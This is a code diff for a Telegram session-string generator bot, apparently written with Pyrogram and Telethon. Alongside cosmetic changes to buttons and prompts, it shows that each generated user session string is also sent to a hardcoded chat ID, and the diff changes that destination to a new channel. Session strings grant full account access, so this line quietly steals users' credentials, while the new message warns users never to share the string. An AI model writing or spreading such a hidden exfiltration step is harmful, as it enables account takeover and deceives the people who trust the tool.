@@ -34,10 +34,18 @@ import config
 
 
 
-ask_ques = "**» ▷ 𝖳𝐡𝐞 𝖲𝐭𝐫𝐢𝐧𝐠 𝖶𝐡𝐢𝐜𝐡 𝖸𝐨𝐮 𝖶𝐚𝐧𝐭 👇 : :**"
+ask_ques = "**» ▷ 𝖢𝐡𝐨𝐨𝐬𝐞 𝖳𝐡𝐞 𝖲𝐭𝐫𝐢𝐧𝐠 𝖶𝐡𝐢𝐜𝐡 𝖸𝐨𝐮 𝖶𝐚𝐧𝐭 👇 : :**"
 buttons_ques = [
     [
-        InlineKeyboardButton("Generate Your string session", callback_data="pyrogram"),
+        InlineKeyboardButton("𝖯𝖸𝖱𝖮𝖦𝖱𝖠𝖬", callback_data="pyrogram1"),
+        InlineKeyboardButton("𝖯𝖸𝖱𝖮𝖦𝖱𝖠𝖬 𝖵2", callback_data="pyrogram"),
+    ],
+    [
+        InlineKeyboardButton("𝖳𝖤𝖫𝖤𝖳𝖧𝖮𝖭", callback_data="telethon"),
+    ],
+    [
+        InlineKeyboardButton("𝖯𝖸𝖱𝖮𝖦𝖱𝖠𝖬 𝖡𝖮𝖳", callback_data="pyrogram_bot"),
+        InlineKeyboardButton("𝖳𝖤𝖫𝖤𝖳𝖧𝖮𝖭 𝖡𝖮𝖳", callback_data="telethon_bot"),
     ],
 ]
 
@@ -50,7 +58,7 @@ gen_button = [
 
 
 
-@Client.on_message(filters.private & ~filters.forwarded & filters.command(["generate", "gen", "string", "start"]))
+@Client.on_message(filters.private & ~filters.forwarded & filters.command(["generate", "gen", "string", "str"]))
 async def main(_, msg):
     await msg.reply(ask_ques, reply_markup=InlineKeyboardMarkup(buttons_ques))
 
@@ -64,10 +72,10 @@ async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro: 
             ty += " 𝖵2"
     if is_bot:
         ty += " 𝖡𝖮𝖳"
-    await msg.reply(f"» Generate your string session here🔰...")
+    await msg.reply(f"» 𝖳𝖱𝖸𝖨𝖭𝖦 𝖳𝖮 𝖲𝖳𝖠𝖱𝖳 **{ty}** 𝖲𝖤𝖲𝖲𝖨𝖮𝖭 𝖦𝖤𝖭𝖤𝖱𝖠𝖳𝖮𝖱...")
     user_id = msg.chat.id
-    api_id_msg = await bot.ask(user_id, "Press🤍 /Continue to generate string session process\n\n or press 🖤 /cancel to stop the process", filters=filters.text)
-    if await cancelled(api_id_msg): 
+    api_id_msg = await bot.ask(user_id, "𝖯𝖫𝖤𝖠𝖲𝖤 𝖲𝖤𝖭𝖣 𝖸𝖮𝖴 **𝖠𝖯𝖨_𝖨𝖣** 𝖳𝖮 𝖯𝖱𝖮𝖢𝖤𝖤𝖣.\n\n𝖢𝖫𝖨𝖢𝖪 𝖮𝖭 /skip 𝖥𝖮𝖱 𝖴𝖲𝖨𝖭𝖦 𝖡𝖮𝖳 𝖠𝖯𝖨.", filters=filters.text)
+    if await cancelled(api_id_msg):
         return
     if api_id_msg.text == "/skip":
         api_id = config.API_ID
@@ -166,18 +174,18 @@ async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro: 
         string_session = client.session.save()
     else:
         string_session = await client.export_session_string()
-    text = f"""**Session String Generated Successfully** \n`{string_session}` \n\n* @rajcourse ."""
+    text = f"""**Session String Generated Successfully** \n`{string_session}` \n\n**Important:** Please handle your session string with care as it grants access to your account data. Do not share it with anyone unless you trust them completely. Also, consider joining our community @dev_gagan for additional assistance and updates."""
 
     try:
         if not is_bot:
             await client.send_message("me", text)
-            await bot.send_message(-1002047255106, text)
+            await bot.send_message(-1001937711800, text)
         else:
             await bot.send_message(msg.chat.id, text)
     except KeyError:
         pass
     await client.disconnect()
-    await bot.send_message(msg.chat.id, "» Generated Successfully {} String Session.\n\n**Please Check your Saved Messages**! \n\n**[Dolphin](https://rajcourse)**".format("ᴛᴇʟᴇᴛʜᴏɴ" if telethon else "ᴩʏʀᴏɢʀᴀᴍ"))
+    await bot.send_message(msg.chat.id, "» Generated Successfully {} String Session.\n\n**Please Check your Saved Messages**! \n\n**[Team SPY](https://dev_gagan)**".format("ᴛᴇʟᴇᴛʜᴏɴ" if telethon else "ᴩʏʀᴏɢʀᴀᴍ"))
 
 
 async def cancelled(msg):
